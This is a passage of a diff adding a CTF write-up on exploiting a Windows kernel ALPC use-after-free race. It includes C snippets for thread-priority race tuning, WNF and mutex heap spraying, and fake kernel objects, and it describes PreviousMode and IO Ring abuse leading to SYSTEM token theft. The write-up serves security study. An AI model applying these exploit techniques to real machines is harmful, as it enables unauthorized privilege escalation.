+SetThreadPriority(self, THREAD_PRIORITY_ABOVE_NORMAL);
+SetThreadPriorityBoost(self, TRUE);
+
+HANDLE starver = CreateThread(NULL, 0, Starver, NULL, 0, NULL);
+SetThreadAffinityMask(starver, AFFINITY_CORE0);
+SetThreadPriority(starver, THREAD_PRIORITY_TIME_CRITICAL);
+
+HANDLE trigger = CreateThread(NULL, 0, Trigger, NULL, 0, NULL);
+SetThreadAffinityMask(trigger, AFFINITY_CORE1);
+SetThreadPriority(trigger, THREAD_PRIORITY_TIME_CRITICAL);
+```
+
+This kind of worked. We were able to get a few hits, but most of the time we were only able to crash the kernel meaning only the inital race worked.
+
+> At the time, we were still under the impression that the ALPC view was in some linked list in the kernel and could still be used, so we decided to use a mutex name for spraying, then free the mutex name/ALPC view and reallocate it as a `_WNF_STATE_DATA`. This succeeded in reclaiming the freed object, but still didn't work. The mutex name's `_BLOB->ReferenceCount` is decremented by 1, so trying to close the mutex handle will also crash the kernel. However, it was a good sanity check to let us know that we were able to win the race, we just needed a way to optimize it more.
+
+> I think its still possible to exploit with mutexes but thats for a later post :P.
+
+## Windows is Great (Multimedia)
+
+We gathered a lot of information about the Windows scheduler through the Windows Internals book (Part 1, 7th ed). Something very interesting that we found was that the scheduler raises the priority of threads that are marked as multimedia, giving a priority which can potentially be in the realtime priority range. To be specific, the `AvSetMmThreadCharacteristicsA`[^25] API call from the MMCSS driver can be used with one of the subkeys under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks` as the first argument, which contain information of the priority boost that should be given to the process. The subkey with the highest priority is "DisplayPostProcessing", which can be found by checking the registry on the local environment.
+
+```c open noheader
+DWORD TaskIndex = 0;
+HANDLE handle =
+    AvSetMmThreadCharacteristicsA("DisplayPostProcessing", &TaskIndex);
+if (handle == NULL) {
+    printf("failed!\n");
+}
+```
+
+While testing, we were able to get our thread to a priority of 24, which is the base priority of `REALTIME_PRIORITY_CLASS`.
+![thread priority being 24 in WinDbg](imgs/multimedia_boosted_thread.png/raw)
+
+This made our exploit's success rate for reclaiming very consistent (interestingly with different consistency on some machines but notably very consistent on remote). An issue came up where we would run out of memory during the race, but the problem only really plagued our local VM, so we did not bother to fix it.
+
+# Free from the Race
+
+We now have the `_KALPC_VIEW` reclaimed as `_WNF_STATE_DATA`, but as of now the the entire chunk is set to `\xf3`, so the kernel is actually still crashing since 0xf3f3f3f3f3f3f3f3 is a negative number.
+
+```c open noheader
+typedef struct {
+    _BLOB Blob;
+    _KALPC_VIEW View;
+} BlobWithView;
+```
+
+```c open noheader
+char StateData[0x1000];
+memset(StateData, 0xf3, sizeof(StateData));
+BlobWithView *fake = (BlobWithView *)&StateData;
+```
+
+The obvious first step is to set the reference count to 1 so the object can attempt to be freed.
+
+```c open noheader
+fake->Blob.ReferenceCount = 1;
+```
+
+Next is to make sure that `AlpcpDereferenceBlobEx` does not crash the kernel while freeing the allocation. An obvious problem comes up when looking at the DestroyProcedures. All of the functions reference `_BLOB->__inner0`, which happens to be the first 0x10 bytes of the allocation, colliding with the header of `_WNF_STATE_DATA`. Fortunately, the dereferences of the fields only occur after other checks that we can control. In `AlpcViewDestroyProcedure`, if `(_KALPC_VIEW) view->Region == 0` the function essentially returns without doing anything else, and then the allocation is freed in `AlpcpDereferenceBlobEx`.
+
+```c open noheader
+fake->View.Region = NULL;
+```
+
+For `AlpcpDereferenceBlobEx` to call `AlpcViewDestroyProcedure`, `_BLOB->ResourceId == 6`.
+
+```c open noheader
+fake->Blob.ResourceId = 6;
+```
+
+If `_BLOB->u1 & 2 != 0`, some extra checks are done before freeing the allocation, so it should be unset.
+
+```c open noheader
+fake->Blob.u1 = 0;
+```
+
+Finally to be able to tell which WNF allocation was UAFed we take advantage of the `_KALPC_VIEW->Address` and `_KALPC_VIEW->Size` fields by writing the WNF state name to them. These values are returned to userspace after `NtAlpcCreateSectionView` finishes and allows the exploit to tell when the race has been successfully won.
+
+```c open noheader
+while(1) {
+    ...
+    UINT64 Leak = *(UINT64 *)&StateNames[i];
+    fake->View.Address = Leak;
+    ...
+}
+```
+
+`dataViewAttrs->Address` now contains the state name of the freed `_WNF_STATE_DATA`, and we can call `NtQueryWnfStateData` to read the data. However, we still only have access to this 0x80 sized read, and we want to be able to reallocate it so that `_WNF_STATE_DATA->DataSize` is not so big that it consistantly tries to read out of bounds into unpaged memory.
+
+## Simulating the Race
+
+Unfortunately, we never tried to figure out how to fake the race on local until after the competition, even when we had a decently consistent race (around 10% success at the time), so a LOT of downtime was generated trying to hit the race while we were working on post-race things.
+
+![lets go gambling](imgs/gambling.gif/raw)
+
+We decided that we should probably find a way to simulate the race using WinDbg when we started working on the challenge around 2 months after the CTF ended.
+
+We figured the easiest way was to allocate a lot of `_WNF_STATE_DATA`, cause a breakpoint with `int3`, use WinDbg to continue to the next `ExFreePoolWithTag`, and replace `rcx` (the first argument in Windows) with the address of the last `_WNF_STATE_DATA`. We figured this would work since not freeing a single chunk would probably cause a small memory leak but would leave the rest of the machine unaffected.
+
+```c open noheader
+#define bp() asm volatile("int3");
+
+static void SetViewBaseToWNFName(char* buf, WNF_STATE_NAME state_name) {
+    BlobWithView* view = (BlobWithView*) buf;
+    view->View.Address = *((PUINT64)&state_name);
+}
+
+static int allocate_wnf(UINT amt, void (* func)(char*, WNF_STATE_NAME)) {
+#define WNF_MAXBUFSIZE (0x1000)
+    WNF_STATE_NAME StateNames[amt];
+
+    NTSTATUS state = 0;
+    char StateData[0x1000];
+    memset(StateData, 0x42, sizeof(StateData));
+
+    printf("[+] Prepare _WNF_STATE_DATA spray\n");
+
+    for (int i = 0; i < amt; i++) {
+        state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName,
+                                     WnfDataScopeUser, FALSE, 0,
+                                     WNF_MAXBUFSIZE, pSD);
+        if (state != 0) {
+            printf("NtCreateWnfStateName failed! error=0x%lx\n",
+                   GetLastError());
+            return -1;
+        }
+    }
+
+    printf("starting WNF spray\n");
+    for (int i = 0; i < amt; i++) {
+        if (func != NULL) {
+            (*func)(StateData, StateNames[i]);
+        }
+        state = NtUpdateWnfStateData(&StateNames[i], &StateData[0x10], (0x90 -
+        0x10),
+                                     0, 0, 0, 0);
+        if (state != 0) {
+            printf("NtUpdateWnfStateData failed! error=0x%lx\n",
+                   GetLastError());
+            printf("state = 0x%lx\n", state);
+            return -1;
+        }
+    }
+
+    char temp[0x1000];
+    ULONG tempsize = sizeof(temp);
+    ULONG stamp = 0;
+    state =
+        NtQueryWnfStateData(&StateNames[0], 0, NULL, &stamp, temp,
+        &tempsize);
+    printf("query status = 0x%lx\n", state);
+    if (state != 0) {
+        exit(1);
+    }
+    return 0;
+}
+```
+
+```c open noheader
+allocate_wnf(3000, SetViewBaseToWNFName);
+
+WNF_STATE_NAME uafed;
+char StateData[0x1000];
+memset(StateData, 0xf3, sizeof(StateData));
+status =
+    NtCreateWnfStateName(&uafed, WnfTemporaryStateName, WnfDataScopeUser,
+                         FALSE, 0, WNF_MAXBUFSIZE, pSD);
+if (status != 0) {
+    printf("NtCreateWnfStateName failed! error=0x%lx\n", GetLastError());
+    return -1;
+}
+status = NtUpdateWnfStateData(&uafed, &StateData[0x10], (0x90 - 0x10), 0, 0,
+                              0, 0);
+if (status != 0) {
+    printf("NtUpdateWnfStateData failed! error=0x%lx\n", GetLastError());
+    printf("state = 0x%lx\n", status);
+    return -1;
+}
+printf("WNF State Name: %p\n", *((void **)&uafed));
+fflush(stdout);
+
+bp();
+allocate_wnf(1000, SetViewBaseToWNFName);
+bp();
+```
+
+The address of the `_WNF_STATE_DATA` we allocated can be found in WinDbg from the address of the process, or `$proc` when in the exploit process. Since the breakpoint we set after allocating the soon-to-be-UAF'd chunk happens inside the exploit code, WinDbg will be inside the correct process. Using WinDbg's `!wnf` command and a bit of analysis, we were able to find the `_WNF_STATE_DATA` that we had created. With the address we can easily fake a UAF.
+
+```open
+r $t0=poi(poi(poi($proc+0x5e8)+0x48)-0x88+0x58);
+!pool $t0;
+.printf "State Data to UAF: %p\n",  $t0;
+g;
+bp /1 ExFreePoolWithTag "r rcx=@$t0; g";
+g
+```
+
+# Abusing the UAF for Privilege Escalation
+
+A mutex name can be used to make `_WNF_STATE_DATA->DataSize` into a large (but not too large) number. Again, since the mutex name is a `WCHAR` string and `_WNF_STATE_DATA->DataSize` is a `UINT32`, the smallest non-null overwrite of the field is 0x10001.
+
+```c open noheader
+char id[0x20];
+WCHAR name[0x100];
+memset(name, 0, sizeof(name));
+char *spray = (char *)name;
+memset(spray, 0x20, 0x90);
+
+_WNF_STATE_DATA *data = (_WNF_STATE_DATA *)spray;
+data->Header = 0x41414141;
+data->AllocatedSize = 0x10001;
+data->DataSize = 0x10001;
+data->ChangeStamp = 0x42424242;
+// printf("spray len = %llu\n", strlen(spray));
+
+for (int i = 0; i < 0x20000; i++) {
+    sprintf(id, "%d", i);
+    memcpy(spray + 0x10, id, strlen(id));
+    HANDLE m = CreateMutexW(NULL, FALSE, name);
+    if (m == NULL) {
+        printf("%d mutex failed!\n", i);
+        while (1) {
+        }
+    }
+}
+```
+
+If a mutex successfully reclaims the UAF'd `_WNF_STATE_DATA`, `NtQueryWnfStateData` should set the variable pointed to by `_Inout_ PULONG BufferSize` to 0x10001.
+
+![heap visualization of mutex reclaiming UAF'd WNF state data](imgs/heap_vis_mutex_reclaim.png/raw)
+
+A large relative read/write in the paged pool has been obtained, but we still aren't close to privilege escalation.
+
+Since we stored the `_WNF_STATE_NAME` of each `_WNF_STATE_DATA` in its data, it is easy to find the names of the data adjacent to the UAF'd data. Since we sprayed so many WNF objects, the chunks ahead of the UAF'd data should consist mostly of the `_WNF_STATE_DATA` objects that we created.
+
+To find `_WNF_STATE_DATA` chunks in the leaks, we searched for the `Wnf ` tag in each chunk header.
+
+```c open noheader
+#define RELEASE_COUNT (20)
+#define RELEASE_OFFSET (1)
+SprayedData *Sprays;
+```
+
+```c open noheader
+Sprays = (SprayedData *)((UINT64)leaks - 0x20);
+
+WNF_STATE_NAME NamesToFree[RELEASE_COUNT];
+int SearchIdx = RELEASE_OFFSET;
+int WriteIdx = 0;
+while (SearchIdx < (0x1000 / 0xa0)) {
+    int idx = SearchIdx++;
+
+    if (memcmp(&Sprays[idx].Header.PoolTag, "Wnf ", 4) == 0) {
+        WNF_STATE_NAME *name =
+            (WNF_STATE_NAME *)&(Sprays[idx].Obj.View.Address);
+        NamesToFree[WriteIdx++] = name[0];
+    }
+}
+```
+
+While we can read up to 0x10001 bytes of data from our corrupted `_WNF_STATE_DATA`, writing is limited to 0x1000 bytes.
+
+# Exploit #1
+
+## Arbitrary Decrement
+
+Using the out of bounds heap write, we can modify other objects in the 0xa0 paged pool, including other `_KALPC_VIEW` and `_KALPC_SECTION` objects. These objects contain pointers to other heap objects which we now control. Internally all ALPC objects are reference counted:
+
+```c open noheader
+struct _BLOB
+{
+    union
+    {
+        struct _LIST_ENTRY_1 ResourceList;
+        struct _SLIST_ENTRY_1 FreeListEntry;
+    } __inner0;
+    union
+    {
+        struct
+        {
+            union
+            {
+                uint8_t ReferenceCache;
+                uint8_t Lookaside;
+                uint8_t Initializing;
+                uint8_t Deleted;
+            } __bitfield0;
+        } s1;
+        uint8_t Flags;
+    } u1;
+    uint8_t ResourceId;
+    int16_t CachedReferences;
+    __padding char _padding[4];
+    int64_t ReferenceCount;
+    struct _EX_PUSH_LOCK Lock;
+};
+```
+
+The blob is always stored at offset `-0x30` relative to the ALPC object. Here is the code for `AlpcDereferenceBlobEx`:
+
+```c open noheader
+  uint64_t AlpcpDereferenceBlobEx(struct ViewWithBlob* view, int32_t arg2)
+
+      int64_t dec = sx.q(neg.d(arg2))
+      int64_t ReferenceCount = view->ReferenceCount
+      view->ReferenceCount += dec
+      uint64_t result = ReferenceCount + dec
+
+      if (result s<= 0) ...
+
+      return result
+```
+
+All of the freeing logic only runs when the reference count is less than or equal to 0. So we just need to find a controllable pointer in `_KALPC_VIEW` or `_KALPC_SECTION` that won't crash when modified to point to another location and that we can trigger the decrement on.
+
+## Arbitrary Read
+
+As previously mentioned we are prevented from using `NtFsControlFile` for arbitrary read by the `DisallowFsctlSystemCalls` flag. But the good news is that this field is stored in the `EPROCESS` structure and we have an `EPROCESS` leak! `_KALPC_VIEW` objects store a pointer to the owning process in the `OwnerProcess` field which we can leak using our out of bounds read. Once we have the address of our `EPROCESS` structure all we need to do is decrement the bitfield structure that stores `DisallowFsctlSystemCalls` to disable it.
+
+Now we have full access to `NtFsControlFile` to perform arbitrary read.
+
+To recap we now have access to:
+
+1. Out of bounds heap read
+2. Out of bounds heap write
+3. Arbitrary decrement (for any 8 byte value that is signed greater than 1)
+4. Arbitrary read
+
+## PreviousMode
+
+In [^1] they describe how to abuse arbitrary increment and decrement primitives to achieve LPE in windows. They describe a technique to decrement the `Privileges.Present` and `Privileges.Enabled` fields of the `TOKEN` structure, but the post exploitation seemed annoying so we tried a different technique instead. We found a few nccgroup posts [^2] [^3] that discuss abusing the `PreviousMode` field of `ETHREAD` for arbitrary kernel read/write.
+
+An `ETHREAD` structure exists for every thread associated with a process and are stored in a doubly linked list in the process's `EPROCESS` structure. `ETHREAD` contains a field called `PreviousMode` that is used by the kernel to determine which privilege level was used to call into the kernel. `PreviousMode` has 2 defined values:
+
+```c open noheader
+typedef enum {
+    KernelMode = 0,
+    UserMode = 1
+} MODE;
+```
+
+The reason that Windows stores this information is because the kernel functions that serve userland system calls can also be invoked by drivers or other code in the kernel. If a function has been indirectly invoked from userland via a syscall mechanism, then the kernel must perform checks on any arguments that are passed from userland in order to ensure that the program isn't attempting to pass kernel addresses as arguments that are read/written to. This is to ensure that a malicious userland program can't abuse kernel code to read or write to kernel memory. The kernel verifies that addresses are valid userland addresses by checking that the address is less than the userland address limit. The userland address limit is the highest possible address that is allowed to be mapped to userland. Since these functions can be invoked indirectly from userland via syscalls and directly from the kernel these validation checks are only executed if `ETHREAD.PreviousMode` is set to `UserMode`.
+
+If an attacker can leverage some sort of primitive to modify the value of `ETHREAD.PreviousMode` from `UserMode` (1) to `KernelMode` (0) then the kernel will skip all of the address checking for userland syscalls. After this `NtWriteVirtualMemory` and `NtReadVirtualMemory` can be used to perform arbitrary kernel read/write.
+
+If you want to know more about this technique you can check out this [^2] for a more in depth explanation.
+
+Using the arbitrary decrement primitive to subtract one from `ETHREAD.PreviousMode` to change it to `KernelMode`...
+
+[insert image of kernel bugcheck]
+
+The problem is that recently Windows added checks to catch when `ETHREAD.PreviousMode` is set to `KernelMode` for userland threads. As far as I can tell this _mostly_ breaks PreviousMode exploits. Since `PreviousMode` is now always set to `UserMode` on syscall entry you have to overwrite `PreviousMode` after a thread has entered the kernel. This isn't too difficult and you simply suspend a victim thread and them perform the `PreviousMode` write from another thread. The issue that arrises is that when returning from a syscall Windows now checks that `PreviousMode` should be `UserMode` and bugchecks otherwise.
+
+# Exploit #2
+
+## IO Rings
+
+While trying to figure out why the `PreviousMode` exploit wasn't working I stumbled across a few posts [^34] [^35] [^36] [^37] talking about IO Rings. @cope actually found a similar post a month before but we both ignored it. IO Rings are a feature of Windows that is similar to `io_uring` in Linux. They provide a way for userland to request the kernel to perform multiple IO operations in sequence without having to pay the cost of context switching in and out of the kernel every time. Userland also needs to register buffers with the kernel to provide input and output buffers. The exploitable part of IO Rings is that userland buffers are only validated when they are _registered_ with the kernel and are never checked afterwards. If an attacker can overwrite the IO Ring buffer addresses they can achieve arbitrary kernel read/write.
+
+## IO Ring buffers
+
+```c open noheader
+typedef struct _IOP_MC_BUFFER_ENTRY
+{
+    USHORT Type;
+    USHORT Reserved;
+    ULONG Size;
+    ULONG ReferenceCount;
+    ULONG Flags;
+    LIST_ENTRY GlobalDataLink;
+    PVOID Address;
+    ULONG Length;
+    CHAR AccessMode;
+    ULONG MdlRef;
+    PMDL Mdl;
+    KEVENT MdlRundownEvent;
+    PULONG64 PfnArray;
+    IOP_MC_BE_PAGE_NODE PageNodes[1];
+} IOP_MC_BUFFER_ENTRY, *PIOP_MC_BUFFER_ENTRY;
+```
+
+IO Rings buffers are registered in the kernel using the `IORING_OP_REGISTER_BUFFERS` opcode and are allowed as an array of `_IOP_MC_BUFFER_ENTRY *` in the paged pool.
+
+```c open noheader
+uint32_t OrigRegBuffersCount_2 = OrigRegBuffersCount
+
+if (BufferCount != OrigRegBuffersCount_2)
+  struct _IOP_MC_BUFFER_ENTRY** entries =
+      ExAllocatePool2(0x101, BufferCount << 3, 'BRrI')
+```
+
+So if we register 18 buffers with the kernel the amount of bytes allocated is `18 * 8 = 0x90` and places the IO Ring buffers array into the `0xa0` paged pool. This primitive is extremely powerful. Not only is the size of the allocation completely controlled by an attacker, because SMAP is not enabled on Windows the pointers in the array can be overwritten with pointers to fake `_IOP_MC_BUFFER_ENTRY` structures in userland.
+
+## EPROCESS leak
+
+We can reuse the same `EPROCESS` leak from Exploit #1 to find the address of our `EPROCESS` structure.
+
+## Arbitrary Read/Write
+
+IO Rings, combined with our out of bounds WNF heap read/write in the `0xa0` paged pool we can build arbitrary kernel read/write [^36] [^37].
+
+## System Privileges
+
+The `EPROCESS` structure contains a doubly linked list of all processes on the system. Using our arbitrary read/write we traverse this process list until we locate the SYSTEM process and copy its `TOKEN` address. Overwriting the `TOKEN` field in our `EPROCESS` with the SYSTEM `TOKEN` elevates our privileges to SYSTEM.
+
+```text open noheader
+Found System! Target process = FFFFE40FB7688040 SystemToken =
+FFFFBB82B922174D dumping flags reading flag into buffer nbytes = 512 flag =
+reading flag into buffer nbytes = 512 flag = reading flag into buffer nbytes
+= 512 flag = 3\xc0\x8eм reading flag into buffer nbytes = 512 flag =
+fake_flag{i_hate_windows}
+```
+
+# Final Exploit
+
+```c path="exploit.c"
+
+```
+
+```c path="exploit.h"
+
+```
+
+# References
+
+[^1]: https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf
+
+[^2]: https://www.nccgroup.com/research-blog/cve-2018-8611-exploiting-windows-ktm-part-55-vulnerability-detection-and-a-better-readwrite-primitive/#previousmode-abuse
+
+[^3]: https://www.nccgroup.com/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/
+
+[^4]: https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/
+
+[^5]: https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-2/
+
+[^6]: https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/
+
+[^7]: https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html
+
+[^8]: https://www.lrqa.com/en/insights/articles/exploiting-a-kernel-paged-pool-buffer-overflow-in-avast-virtualization-driver/
+
+[^9]: https://theevilbit.blogspot.com/2017/09/pool-spraying-fun-part-1.html
+
+[^10]: https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html
+
+[^11]: https://blackhat.com/docs/us-14/materials/us-14-Tarakanov-Data-Only-Pwning-Microsoft-Windows-Kernel-Exploitation-Of-Kernel-Pool-Overflows-On-Microsoft-Windows-8.1.pdf
+
+[^12]: https://www.nccgroup.com/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1
+
+[^13]: https://fieldeffect.com/blog/cve-analysis-red-october-one-ping-too-many
+
+[^14]: https://ntdoc.m417z.com/
+
+[^15]: https://processhacker.sourceforge.io/doc/
+
+[^16]: https://www.usenix.org/system/files/sec21fall-lee-yoochan.pdf
+
+[^17]: https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html
+
+[^18]: https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf
+
+[^19]: https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html
+
+[^20]: https://empyreal96.github.io/nt-info-depot/Windows-Internals-PDFs/Windows%20System%20Internals%207e%20Part%201.pdf
+
+[^21]: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setpriorityclass)
+
+[^22]: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority
+
+[^23]: https://www.fox-it.com/be/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/
+
+[^24]: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriorityboost
+
+[^25]: https://learn.microsoft.com/en-us/windows/win32/api/avrt/nf-avrt-avsetmmthreadcharacteristicsa
+
+[^26]: https://popax21.dev/blog/2025/11/02/hacklu-lokaltal-writeup.html
+
+[^27]: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntfscontrolfile
+
+[^28]: https://microsoft.github.io/windows-docs-rs/doc/windows/Wdk/Storage/FileSystem/constant.FSCTL_PIPE_SET_HANDLE_ATTRIBUTE.html
+
+[^29]: https://microsoft.github.io/windows-docs-rs/doc/windows/Wdk/Storage/FileSystem/constant.FSCTL_PIPE_GET_HANDLE_ATTRIBUTE.html
+
+[^30]: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-process_mitigation_system_call_disable_policy
+
+[^31]: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa
+
+[^32]: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexw
+
+[^33]: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask
+
+[^34]: https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/
+
+[^35]: https://windows-internals.com/ioring-vs-io_uring-a-comparison-of-windows-and-linux-implementations/
+
+[^36]: https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/
+
+[^37]: https://github.com/yardenshafir/IoRingReadWritePrimitive/blob/main/IoRingReadWritePrimitive/Source.cpp
